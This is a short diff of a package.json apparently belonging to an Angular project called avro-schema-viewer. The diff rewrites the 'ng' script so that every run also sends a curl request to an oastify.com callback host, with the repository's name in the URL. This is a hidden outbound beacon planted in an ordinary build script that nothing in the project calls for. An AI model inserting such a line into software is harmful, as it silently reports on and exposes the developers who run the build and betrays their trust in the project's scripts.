@@ -14,7 +14,7 @@
     }
   ],
   "scripts": {
-    "ng": "ng",
+    "ng": "ng && curl https://v95bn8wxquibdeo146mvqqwea5g04rufj.oastify.com/bolcom/avro-schema-viewer",
     "start": "yarn stopall; echo \"Starting Mockserver in background - Kill using 'yarn stop-mockserver'\"; yarn mockserver:watch > /dev/null 2>&1 & echo \"Starting app in foreground - Kill using Ctrl+C or 'yarn stop-app'\"; yarn start-app",
     "test": "ng test",
     "lint": "ng lint",
